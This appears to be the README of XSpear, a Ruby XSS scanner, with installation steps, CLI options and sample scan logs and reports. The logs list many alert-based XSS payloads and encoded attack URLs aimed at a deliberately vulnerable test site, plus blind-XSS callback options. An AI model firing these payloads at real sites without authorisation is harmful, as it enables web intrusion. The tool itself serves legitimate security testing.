<img src="https://user-images.githubusercontent.com/13212227/62058818-ffcef780-b25c-11e9-9a35-36537efbcca7.png" width=100%>

# XSpear
XSpear is XSS Scanner on ruby gems

<img src="https://img.shields.io/github/languages/top/hahwul/xspear?color=red"> <img src="https://img.shields.io/gem/v/XSpear.svg"> <img src="https://img.shields.io/gem/dt/XSpear.svg"> <img src="https://img.shields.io/librariesio/sourcerank/rubygems/Xspear"> <img src="https://api.codacy.com/project/badge/Grade/0fa0f7cd75e34e7b9800f4fdf147605e"> <img src="https://img.shields.io/github/license/hahwul/XSpear.svg"> <a href="https://twitter.com/intent/follow?screen_name=hahwul"><img src="https://img.shields.io/twitter/follow/hahwul?style=flat-square"></a>

## TOC
- [XSpear](#xspear)
  * [Key features](#key-features)
  * [Installation](#installation)
    + [Dependency gems](#dependency-gems)
  * [Usage on cli](#usage-on-cli)
    + [Result types](#result-types)
    + [Verbose Mode](#verbose-mode)
    + [Case by Case](#case-by-case)
    + [Sample log](#sample-log)
  * [Usage on ruby code](#usage-on-ruby-code)
  * [Add Scanning Module](#add-scanning-module)
  * [Update](#update)
  * [Development](#development)
  * [Contributing](#contributing)
  * [Donate](#donate)
  * [License](#license)
  * [Code of Conduct](#code-of-conduct)
  * [ScreenShot](#screenshot)
  * [Video](#video)

## Key features
- Pattern matching based XSS scanning
- Detect `alert` `confirm` `prompt` event on headless browser (with Selenium)
- Testing request/response for XSS protection bypass and reflected(or all) params<br>
  + Reflected Params
  + All params(for blind xss, anytings)
  + Filtered test `event handler` `HTML tag` `Special Char` `Useful code`
  + Testing custom payload for only you!
- Testing Blind XSS (with XSS Hunter , ezXSS, HBXSS, Etc all url base blind test...)
- Dynamic/Static Analysis
  + Find SQL Error pattern
  + Analysis Security headers(`CSP` `HSTS` `X-frame-options`, `XSS-protection` etc.. )
  + Analysis Other headers..(Server version, Content-Type, etc...)
  + XSS Testing to URI Path
  + Testing Only Parameter Analysis (aka no-XSS mode)
- Scanning from Raw file(Burp suite, ZAP Request)
- XSpear running on ruby code(with Gem library)
- Show `table base cli-report` and `filtered rule`, `testing raw query`(url)
- Testing at selected parameters
- Support output format `cli` `json` `html`
  + cli
  + json
  + html
- Support Verbose level (0~3)
  + 0: quite mode(only result)
  + 1: show scanning status(default)
  + 2: show scanning logs
  + 3: show detail log(req/res)
- Support custom callback code to any test various attack vectors
- Support Config file

## Installation

Install it yourself as:

    $ gem install XSpear

Or install it yourself as (local file / download [latest](https://github.com/hahwul/XSpear/releases/latest) ):

    $ gem install XSpear-{version}.gem
    
Add this line to your application's Gemfile:

```ruby
gem 'XSpear'
```

And then execute:

    $ bundle

### Dependency gems
`colorize` `selenium-webdriver` `terminal-table` `progress_bar`<br>
If you configured it to install automatically in the Gem library, but it behaves abnormally, install it with the following command.

```
$ gem install colorize
$ gem install selenium-webdriver
$ gem install terminal-table
$ gem install progress_bar
```

## Usage on cli

```
Usage: xspear -u [target] -[options] [value]
[ e.g ]
$ xspear -u 'https://www.hahwul.com/?q=123' --cookie='role=admin' -v 1 -a 
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 0 -o json

[ Options ]
    -u, --url=target_URL             [required] Target Url
    -d, --data=POST Body             [optional] POST Method Body data
    -a, --test-all-params            [optional] test to all params(include not reflected)
        --no-xss                     [optional] no testing xss, only parameters analysis
        --headers=HEADERS            [optional] Add HTTP Headers
        --cookie=COOKIE              [optional] Add Cookie
        --custom-payload=FILENAME    [optional] Load custom payload json file
        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
    -p, --param=PARAM                [optional] Test paramters
    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
                                      + with XSS Hunter, ezXSS, HBXSS, etc...
                                      + e.g : -b https://hahwul.xss.ht
    -t, --threads=NUMBER             [optional] thread , default: 10
    -o, --output=FORMAT              [optional] Output format (cli , json)
    -c, --config=FILENAME            [optional] Using config.json
    -v, --verbose=0~3                [optional] Show log depth
                                      + v=0 : quite mode(only result)
                                      + v=1 : show scanning status(default)
                                      + v=2 : show scanning logs
                                      + v=3 : show detail log(req/res)
    -h, --help                       Prints this help
        --version                    Show XSpear version
        --update                     Show how to update


```
### Result types
- (I)NFO: Get information ( e.g sql error , filterd rule, reflected params, etc..)
- (V)UNL: Vulnerable XSS, Checked alert/prompt/confirm with Selenium
- (L)OW: Low level issue
- (M)EDIUM: medium level issue
- (H)IGH: high level issue

### Verbose Mode
**[0] quite mode(show only result)**
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 0
you see report
```
**[1] show progress bar (default)**
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 1
[*] analysis request..
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]

[#######################################] [249/249] [100.00%] [01:05] [00:00] [  3.83/s]
...
you see report
```
**[2] show scanning logs**
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 2
[*] analysis request..
[I] [22:42:41] [200/OK] [param: cat][Found SQL Error Pattern]
[-] [22:42:41] [200/OK] 'STATIC' not reflected
[-] [22:42:41] [200/OK] 'cat' not reflected <script>alert(45)</script>
[I] [22:42:41] [200/OK] reflected rEfe6[param: cat][reflected parameter]
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]
[I] [22:42:43] [200/OK] reflected onhwul=64[param: cat][reflected EHon{any} pattern]
[-] [22:42:54] [200/OK] 'cat' not reflected <img/src onerror=alert(45)>
[-] [22:42:54] [200/OK] 'cat' not reflected <svg/onload=alert(45)>
[H] [22:42:54] [200/OK] reflected <script>alert(45)</script>[param: cat][reflected XSS Code]
[V] [22:42:59] [200/OK] found alert/prompt/confirm (45) in selenium!! '"><svg/onload=alert(45)>[param: cat][triggered <svg/onload=alert(45)>]
...
you see report
```
**[3] show scanning detail logs**
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" -v 3
[*] analysis request..
[-] [22:56:21] [200/OK] http://testphp.vulnweb.com/listproducts.php?cat=123 in url
[ Request ]
{"accept-encoding"=>["gzip;q=1.0,deflate;q=0.6,identity;q=0.3"], "accept"=>["*/*"], "user-agent"=>["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"], "connection"=>["keep-alive"], "host"=>["testphp.vulnweb.com"]}
[ Response ]
{"server"=>["nginx/1.4.1"], "date"=>["Sun, 29 Dec 2019 13:53:23 GMT"], "content-type"=>["text/html"], "transfer-encoding"=>["chunked"], "connection"=>["keep-alive"], "x-powered-by"=>["PHP/5.3.10-1~lucid+2uwsgi2"]}
[-] [22:56:21] [200/OK] 'STATIC' not reflected
[-] [22:56:21] [200/OK] cat=123rEfe6 in url
...
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 2 param + blind XSS ]
[*] test query generation is complete. [249 query]
[*] starting XSS Scanning. [10 threads]
...
[ Request ]
{"accept-encoding"=>["gzip;q=1.0,deflate;q=0.6,identity;q=0.3"], "accept"=>["*/*"], "user-agent"=>["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"], "connection"=>["keep-alive"], "host"=>["testphp.vulnweb.com"]}
[ Response ]
{"server"=>["nginx/1.4.1"], "date"=>["Sun, 29 Dec 2019 13:54:36 GMT"], "content-type"=>["text/html"], "transfer-encoding"=>["chunked"], "connection"=>["keep-alive"], "x-powered-by"=>["PHP/5.3.10-1~lucid+2uwsgi2"]}
[H] [22:57:33] [200/OK] reflected <keygen autofocus onfocus=alert(45)>[param: cat][reflected onfocus XSS Code]
...
you see report
```
### Case by Case
**Scanning XSS**
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy"
```

**Only JSON output**
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -d "searchFor=yy" -o json -v 0
```

**Set scanning thread**
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -t 30
```

**Testing at selected parameters**
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" -p cat,test
```

**Testing at all parameters**<br>
(This option is tested with or without reflection.)
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" -a
```

**Testing Only parameter analysis (aka no-xss mode)**<br>
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul" --no-xss
```

**Testing blind xss(all params)**<br>
(Should be used as much as possible because Blind XSS is everywhere)<br>
```
$ xspear -u "http://testphp.vulnweb.com/search.php?test=query" -b "https://hahwul.xss.ht" -a

# Set your blind xss host. <-b options>
```

**Testing custom payload**<br>
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123" --custom-payload=custom_payload.json 
```
in custom_payload.json file
```json
[
  {
    "payload":"<svg/onload=alert(1)>",
    "callback":"P1",
    "descript":"blahblah~"
  },
  {
    "payload":"<svg/onload=alert(1)>",
    "callback":"P2",
    "descript":"blahblah~"
  },
  {
    "payload":"<>",
    "callback":"P1",
    "descript":"blahblah~"
  }
]
```

**for Pipeline**<br>
```
$ xspear -u {target} -b "your-blind-xss-host" -a -v 0 -o json

# -u : target 
# -b : testing blind xss
# -a : test all params(test to not reflected param)
# -v : verbose, not showing logs at value 1.
# -o : output optios, json!
```
result json data
```
{
    "starttime": "2019-12-25 00:02:58 +0900",
    "endtime": "2019-12-25 00:03:31 +0900",
    "issue_count": 25,
    "issue_list": [{
        "id": 0,
        "type": "INFO",
        "issue": "DYNAMIC ANALYSIS",
        "method": "GET",
        "param": "cat",
        "payload": "XsPeaR\"",
        "description": "Found SQL Error Pattern"
    }, {
        "id": 1,
        "type": "INFO",
        "issue": "STATIC ANALYSIS",
        "method": "GET",
        "param": "-",
        "payload": "<original query>",
        "description": "Found Server: nginx/1.4.1"
    }, {
        "id": 2,
        "type": "INFO",
        "issue": "STATIC ANALYSIS",
        "method": "GET",
        "param": "-",
        "payload": "<original query>",
        "description": "Not set HSTS"
    }, {
        "id": 3,
        "type": "INFO",
        "issue": "STATIC ANALYSIS",
        "method": "GET",
        "param": "-",
        "payload": "<original query>",
        "description": "Content-Type: text/html"
    }, {
        "id": 4,
        "type": "LOW",
        "issue": "STATIC ANALYSIS",
        "method": "GET",
        "param": "-",
        "payload": "<original query>",
        "description": "Not Set X-Frame-Options"
    }, {
        "id": 5,
        "type": "MIDUM",
        "issue": "STATIC ANALYSIS",
        "method": "GET",
        "param": "-",
        "payload": "<original query>",
        "description": "Not Set CSP"
    }, {
        "id": 6,
        "type": "INFO",
        "issue": "REFLECTED",
        "method": "GET",
        "param": "cat",
        "payload": "rEfe6",
        "description": "reflected parameter"
    }, {
        "id": 7,
        "type": "INFO",
        "issue": "FILERD RULE",
        "method": "GET",
        "param": "cat",
        "payload": "onhwul=64",
        "description": "not filtered event handler on{any} pattern"
    }
....
, {
        "id": 17,
        "type": "HIGH",
        "issue": "XSS",
        "method": "GET",
        "param": "cat",
        "payload": "<audio src onloadstart=alert(45)>",
        "description": "reflected HTML5 XSS Code"
    }, {
        "id": 18,
        "type": "HIGH",
        "issue": "XSS",
        "method": "GET",
        "param": "cat",
        "payload": "<keygen autofocus onfocus=alert(45)>",
        "description": "reflected onfocus XSS Code"
 ....
    }, {
        "id": 24,
        "type": "HIGH",
        "issue": "XSS",
        "method": "GET",
        "param": "cat",
        "payload": "<marquee onstart=alert(45)>",
        "description": "triggered <marquee onstart=alert(45)>"
    }]
}
```
(Items marked as `triggered` are actually payloads that work in the browser.)

**XSpear on Burpsuite**<br>
https://github.com/hahwul/XSpear/tree/master/forBurp

etc...

### Sample log
**Scanning XSS**
```
xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=z"
    )  (
 ( /(  )\ )
 )\())(()/(          (     )  (
((_)\  /(_))`  )    ))\ ( /(  )(
__((_)(_))  /(/(   /((_))(_))(()\
\ \/ // __|((_)_\ (_)) ((_)_  ((_)
 >  < \__ \| '_ \)/ -_)/ _` || '_|
/_/\_\|___/| .__/ \___|\__,_||_|    />
           |_|                   \ /<
{\\\\\\\\\\\\\BYHAHWUL\\\\\\\\\\\(0):::<======================-
                                 / \<
                                    \>       [ v1.4.0 ]
[*] analysis request..
[*] used test-reflected-params mode(default)
[*] creating a test query [for reflected 1 param ]
[*] test query generation is complete. [251 query]
[*] starting XSS Scanning. [10 threads]
...snip...
[*] finish scan. the report is being generated..
+----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
|                                                            [ XSpear report ]                                                            |
|                              http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fff... (snip)                              |
|                                 2019-08-14 23:50:34 +0900 ~ 2019-08-14 23:51:07 +0900 Found 24 issues.                                  |
+----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
| NO | TYPE  | ISSUE            | METHOD | PARAM | PAYLOAD                                | DESCRIPTION                                   |
+----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
| 0  | INFO  | STATIC ANALYSIS  | GET    | -     | <original query>                       | Found Server: nginx/1.4.1                     |
| 1  | INFO  | STATIC ANALYSIS  | GET    | -     | <original query>                       | Not set HSTS                                  |
| 2  | INFO  | STATIC ANALYSIS  | GET    | -     | <original query>                       | Content-Type: text/html                       |
| 3  | LOW   | STATIC ANALYSIS  | GET    | -     | <original query>                       | Not Set X-Frame-Options                       |
| 4  | MIDUM | STATIC ANALYSIS  | GET    | -     | <original query>                       | Not Set CSP                                   |
| 5  | INFO  | DYNAMIC ANALYSIS | GET    | cat   | XsPeaR"                                | Found SQL Error Pattern                       |
| 6  | INFO  | REFLECTED        | GET    | cat   | rEfe6                                  | reflected parameter                           |
| 7  | INFO  | FILERD RULE      | GET    | cat   | onhwul=64                              | not filtered event handler on{any} pattern    |
| 8  | HIGH  | XSS              | GET    | cat   | <script>alert(45)</script>             | reflected XSS Code                            |
| 9  | HIGH  | XSS              | GET    | cat   | <marquee onstart=alert(45)>            | reflected HTML5 XSS Code                      |
| 10 | HIGH  | XSS              | GET    | cat   | <details/open/ontoggle="alert`45`">    | reflected HTML5 XSS Code                      |
| 11 | HIGH  | XSS              | GET    | cat   | <select autofocus onfocus=alert(45)>   | reflected onfocus XSS Code                    |
| 12 | HIGH  | XSS              | GET    | cat   | <input autofocus onfocus=alert(45)>    | reflected onfocus XSS Code                    |
| 13 | HIGH  | XSS              | GET    | cat   | <textarea autofocus onfocus=alert(45)> | reflected onfocus XSS Code                    |
| 14 | HIGH  | XSS              | GET    | cat   | <audio src onloadstart=alert(45)>      | reflected HTML5 XSS Code                      |
| 15 | HIGH  | XSS              | GET    | cat   | <meter onmouseover=alert(45)>0</meter> | reflected HTML5 XSS Code                      |
| 16 | HIGH  | XSS              | GET    | cat   | "><iframe/src=JavaScriPt:alert(45)>    | reflected XSS Code                            |
| 17 | HIGH  | XSS              | GET    | cat   | <video/poster/onerror=alert(45)>       | reflected HTML5 XSS Code                      |
| 18 | HIGH  | XSS              | GET    | cat   | <keygen autofocus onfocus=alert(45)>   | reflected onfocus XSS Code                    |
| 19 | VULN  | XSS              | GET    | cat   | <script>alert(45)</script>             | triggered <script>alert(45)</script>          |
| 20 | HIGH  | XSS              | GET    | cat   | <marquee onstart=alert(45)>            | triggered <marquee onstart=alert(45)>         |
| 21 | HIGH  | XSS              | GET    | cat   | <details/open/ontoggle="alert(45)">    | triggered <details/open/ontoggle="alert(45)"> |
| 22 | HIGH  | XSS              | GET    | cat   | <audio src onloadstart=alert(45)>      | triggered <audio src onloadstart=alert(45)>   |
| 23 | VULN  | XSS              | GET    | cat   | '"><svg/onload=alert(45)>              | triggered <svg/onload=alert(45)>              |
+----+-------+------------------+--------+-------+----------------------------------------+-----------------------------------------------+
< Available Objects >
[cat] param
 + Available Special Char: ` ( \ ' { ) } [ : $ ]
 + Available Event Handler: "onBeforeEditFocus","onAbort","onActivate","onAfterUpdate","onBeforeCopy","onAfterPrint","onBeforeActivate","onBeforeCut","onBeforeDeactivate","onChange","onBeforePrint","onBounce","onBeforeUnload","onCellChange","onBeforePaste","onClick","onBegin","onBlur","onBeforeUpdate","onDataSetChanged","onCut","onDblClick","onCopy","onContextMenu","onDataSetComplete","onDeactivate","onDataAvailable","onControlSelect","onDrag","onDrop","onDragEnd","onEnd","onDragLeave","onDragStart","onDragOver","onDragEnter","onDragDrop","onError","onErrorUpdate","onFinish","onFilterChange","onKeyPress","onHelp","onFocus","onInput","onHashChange","onKeyDown","onFocusIn","onFocusOut","onMessage","onMouseDown","onLoad","onLayoutComplete","onMouseEnter","onLoseCapture","onloadstart","onMediaError","onKeyUp","onMediaComplete","onMouseOver","onMouseWheel","onMove","onMouseMove","onMouseOut","onOffline","onMoveStart","onMouseLeave","onMouseUp","onMoveEnd","onPropertyChange","onOnline","onPause","onPaste","onReadyStateChange","onRedo","onProgress","onPopState","onOutOfSync","onRepeat","onResume","onRowExit","onReset","onResizeEnd","onRowsEnter","onResizeStart","onReverse","onRowDelete","onRowInserted","onResize","onStop","onSeek","onSelect","onSubmit","onStorage","onStart","onScroll","onSelectionChange","onSyncRestored","onSelectStart","onUnload","ontouchstart","onbeforescriptexecute","onTimeError","onURLFlip","ontouchmove","ontouchend","onTrackChange","onUndo","onafterscriptexecute","onpointermove","onpointerleave","onpointerup","onpointerover","onpointerdown","onpointerenter","onloadstart","onloadend","onpointerout"
 + Available HTML Tag: "script","img","embed","video","audio","meta","style","frame","iframe","svg","object","frameset","applet"
 + Available Useful Code: "document.cookie","document.location","window.location"

< Raw Query >
[0] http://testphp.vulnweb.com/listproducts.php?-
..snip..
[19] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
[20] http://testphp.vulnweb.com/listproducts.php?cat=123%22'%3E%3Cmarquee%20onstart=alert(45)%3E&zfdfasdf=124fffff
[21] http://testphp.vulnweb.com/listproducts.php?cat=123%22'%3E%3Cdetails/open/ontoggle=%22alert(45)%22%3E&zfdfasdf=124fffff
[22] http://testphp.vulnweb.com/listproducts.php?cat=123%22'%3E%3Caudio%20src%20onloadstart=alert(45)%3E&zfdfasdf=124fffff
[23] http://testphp.vulnweb.com/listproducts.php?cat=123'%22%3E%3Csvg/onload=alert(45)%3E&zfdfasdf=124fffff

...snip...
```            

**to JSON**
```
$ xspear -u "http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fffff" -v 1 -o json
{"starttime":"2019-08-14 23:58:12 +0900","endtime":"2019-08-14 23:58:44 +0900","issue_count":24,"issue_list":[{"id":0,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Found Server: nginx/1.4.1"},{"id":1,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not set HSTS"},{"id":2,"type":"INFO","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Content-Type: text/html"},{"id":3,"type":"LOW","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set X-Frame-Options"},{"id":4,"type":"MIDUM","issue":"STATIC ANALYSIS","method":"GET","param":"-","payload":"<original query>","description":"Not Set CSP"},{"id":5,"type":"INFO","issue":"DYNAMIC ANALYSIS","method":"GET","param":"cat","payload":"XsPeaR\"","description":"Found SQL Error Pattern"},{"id":6,"type":"INFO","issue":"REFLECTED","method":"GET","param":"cat","payload":"rEfe6","description":"reflected parameter"},{"id":7,"type":"INFO","issue":"FILERD RULE","method":"GET","param":"cat","payload":"onhwul=64","description":"not filtered event handler on{any} pattern"},{"id":8,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"reflected XSS Code"},{"id":9,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<textarea autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":10,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<video/poster/onerror=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":11,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":12,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert`45`\">","description":"reflected HTML5 XSS Code"},{"id":13,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<select autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":14,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"reflected HTML5 XSS Code"},{"id":15,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<input autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":16,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"\"><iframe/src=JavaScriPt:alert(45)>","description":"reflected XSS Code"},{"id":17,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<meter onmouseover=alert(45)>0</meter>","description":"reflected HTML5 XSS Code"},{"id":18,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<keygen autofocus onfocus=alert(45)>","description":"reflected onfocus XSS Code"},{"id":19,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<audio src onloadstart=alert(45)>","description":"triggered <audio src onloadstart=alert(45)>"},{"id":20,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<marquee onstart=alert(45)>","description":"triggered <marquee onstart=alert(45)>"},{"id":21,"type":"HIGH","issue":"XSS","method":"GET","param":"cat","payload":"<details/open/ontoggle=\"alert(45)\">","description":"triggered <details/open/ontoggle=\"alert(45)\">"},{"id":22,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"<script>alert(45)</script>","description":"triggered <script>alert(45)</script>"},{"id":23,"type":"VULN","issue":"XSS","method":"GET","param":"cat","payload":"'\"><svg/onload=alert(45)>","description":"triggered <svg/onload=alert(45)>"}]}
```

## Usage on ruby code
```ruby
require 'XSPear'

# Set options
options = {}
options['thread'] = 30
options['cookie'] = "data=123"
options['blind'] = "https://hahwul.xss.ht"
options['output'] = json

# Create XSpear object with url, options
s = XspearScan.new "https://www.hahwul.com?target_url", options

# Scanning
s.run
result = s.report.to_json
r = JSON.parse result
```

## Add Scanning Module
**1) Add `makeQueryPattern`**
```ruby
makeQueryPattern('type', 'query,', 'pattern', 'category', "description", "callback funcion")
# type: f(ilterd?) r(eflected?) x(ss?)
# category i(nfo) v(uln) l(ow) m(edium) h(igh) 

# e.g 
# makeQueryPattern('f', 'XsPeaR,', 'XsPeaR,', 'i', "not filtered "+",".blue, CallbackStringMatch)
```

**2) if other callback, write callback class override `ScanCallbackFunc`**
e.g
```ruby
  class CallbackStringMatch < ScanCallbackFunc
    def run
      if @response.body.include? @query
        [true, "reflected #{@query}"]
      else
        [false, "not reflected #{@query}"]
      end
    end
  end
```

Parent class(ScanCallbackFunc)
```ruby
class ScanCallbackFunc()
    def initialize(url, method, query, response)
      @url = url
      @method = method
      @query = query
      @response = response
      # self.run
    end
    
    def run
      # override
    end
end
```

Common Callback Class
- CallbackXSSSelenium
- CallbackErrorPatternMatch
- CallbackCheckHeaders
- CallbackStringMatch
- CallbackNotAdded
- etc...

## Update
if nomal user
```
$ gem update XSpear
```

if developers (soft)
```
$ git pull -v
```
if develpers (hard)
```
$ git reset --hard HEAD; git pull -v
```

## RubyDoc
https://www.rubydoc.info/gems/XSpear/

## Development

After checking out the repo, run `bin/setup` to install dependencies. Then, run `rake spec` to run the tests. You can also run `bin/console` for an interactive prompt that will allow you to experiment.

To install this gem onto your local machine, run `bundle exec rake install`. To release a new version, update the version number in `version.rb`, and then run `bundle exec rake release`, which will create a git tag for the version, push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/hahwul/XSpear. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.

## Donate

I like coffee! I'm a coffee addict.<br>
<a href="https://www.paypal.me/hahwul"><img src="https://www.paypalobjects.com/digitalassets/c/website/logo/full-text/pp_fc_hl.svg" height="50px"></a>
<a href="https://www.buymeacoffee.com/hahwul"><img src="https://cdn.buymeacoffee.com/buttons/default-black.png" alt="Buy Me A Coffee" height="50px"></a>

## License

The gem is available as open source under the terms of the [MIT License](https://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the XSpear project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://github.com/[USERNAME]/XSpear/blob/master/CODE_OF_CONDUCT.md).

## ScreenShot
< Scanning Image>
<img src="https://user-images.githubusercontent.com/13212227/71557939-c8c17400-2a90-11ea-9307-6cd9b9736afc.png" width=100%>
< CLI-Report 1 >
<img src="https://user-images.githubusercontent.com/13212227/71557940-c8c17400-2a90-11ea-90f4-589366f8fba8.png" width=100%>
< CLI-Report 2 >
<img src="https://user-images.githubusercontent.com/13212227/71557941-c8c17400-2a90-11ea-9cfe-90e9b5d51c34.png" width=100%>
< JSON Report >
<img src="https://user-images.githubusercontent.com/13212227/63032411-b8996580-bef0-11e9-8aee-0b80fe87f50d.png" width=100%>
< HTML Report >
<img src="https://user-images.githubusercontent.com/13212227/74363820-b1570400-4e0e-11ea-9ce5-c78319a9d81c.png" width=100%>

## Video
[![asciicast](https://asciinema.org/a/290126.svg)](https://asciinema.org/a/290126)
